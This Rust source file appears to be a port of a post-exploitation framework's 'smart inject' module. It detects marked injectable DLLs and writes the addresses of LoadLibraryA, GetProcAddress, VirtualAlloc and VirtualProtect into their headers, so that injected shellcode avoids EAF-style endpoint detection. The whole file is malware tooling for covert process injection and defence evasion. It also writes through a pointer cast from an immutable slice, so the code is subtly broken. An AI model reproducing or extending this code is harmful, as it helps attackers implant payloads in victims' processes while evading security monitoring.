//! Port of src/inject_smart.cpp — Smart Inject propagates pointers to a DLL
//! when doing same-arch process injection, to avoid EAF and real-time
//! prevention measures that use EAF-like techniques to detect shellcode
//! settling into a process.

use crate::inject::InjectContext;
use std::ffi::c_void;
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{VirtualAlloc, VirtualProtect};

/// our smart inject pointers
#[repr(C)]
#[derive(Clone, Copy)]
struct SmartInject {
    p_load_library_a: *mut c_void,
    p_get_proc_address: *mut c_void,
    p_virtual_alloc: *mut c_void,
    p_virtual_protect: *mut c_void,
    check: u32,
}

/// A quick view to check if we're a SmartInject-enabled DLL
/// (SMARTINJECTCHECK: WORD magic, char padding[1018], DWORD header).
const SMARTINJECT_HEADER_OFFSET: usize = 2 + 1018; // 1020

/// Determine if smart inject is on (or not) (isSmartInject).
pub fn is_smart_inject(buffer: &[u8], length: usize) -> bool {
    /* our smallest post-ex DLL is still >=50KB */
    if length < 51200 {
        return false;
    }
    if buffer.len() < 1024 {
        return false;
    }

    /* cast our buffer to our header and look for the smart inject protocol */
    let magic = u16::from_le_bytes([buffer[0], buffer[1]]);
    let header = u32::from_le_bytes([
        buffer[SMARTINJECT_HEADER_OFFSET],
        buffer[SMARTINJECT_HEADER_OFFSET + 1],
        buffer[SMARTINJECT_HEADER_OFFSET + 2],
        buffer[SMARTINJECT_HEADER_OFFSET + 3],
    ]);

    magic == 0x5A4D && header == 0xF4F4F4F4
}

/// How much (if any) to alter the buffer value (SetupSmartInject). The
/// pointers are written into the buffer right at the end of the headers;
/// the C++ takes `char * buffer` and writes in place, so we do the same
/// through the (guaranteed writable) shellcode buffer.
pub fn setup_smart_inject(context: &mut InjectContext, buffer: &[u8], length: usize) {
    /* if we're not smart inject, do nothing */
    if !is_smart_inject(buffer, length) {
        return;
    }

    /* check that we're the same arch! */
    if !context.same_arch {
        return;
    }

    /* we're located right at the end of the headers */
    let offset = 1024usize.saturating_sub(std::mem::size_of::<SmartInject>());
    let ptrs = unsafe { buffer.as_ptr().add(offset) as *mut SmartInject };

    /* setup our smart inject values */
    unsafe {
        (*ptrs).check = 0xF00D;
        (*ptrs).p_get_proc_address = GetProcAddress as *const () as *mut c_void;
        (*ptrs).p_load_library_a = LoadLibraryA as *const () as *mut c_void;
        (*ptrs).p_virtual_alloc = VirtualAlloc as *const () as *mut c_void;
        (*ptrs).p_virtual_protect = VirtualProtect as *const () as *mut c_void;
    }
}
